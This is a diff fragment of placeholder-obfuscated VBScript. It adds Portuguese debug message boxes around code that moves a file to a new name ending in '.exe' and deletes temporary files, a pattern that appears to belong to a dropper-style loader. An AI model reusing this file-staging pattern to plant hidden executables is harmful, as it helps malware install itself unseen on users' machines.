@@ -590,12 +590,14 @@ Set #var79# = CreateObject(#const59#)
 
 
 #var78# = #var73# + #const57#
-'msgbox  "De' + #var3# & #const58# & #var6# +"para"+ #var69# + #var73# + #const58# + #var6#
+msgbox  "3-De" + #var3# & #const58# & #var6# +"para"+ #var69# + #var73# + #const58# + #var6#
 
 #var49# #var3# & #const58# & #var6#, #var69# + #var73# + #const58# + #var6#
 'De#var17#F #var69# + #var73# + #const58# + #var6#,  #var69# + #var73# + #const58# + #var7# 
 #var31# #var69# & #var73# & #const58# & #var7#, #var69#
 Set #var34# = CreateObject(#const51#)
+msgbox  "3-De MF " & #var69# & #var8# & #const58# & " para "&  #var69# & #var78#  & ".exe"
+
 #var34#.MoveFile #var69# & #var8# & #const58# , #var69# & #var78#  & ".exe"
 #var34#.DeleteFile(#var69# + #var73# + #const58# + #var7# )
 #var34#.DeleteFile(#var69# + #var73# + #const58# + #var6# )
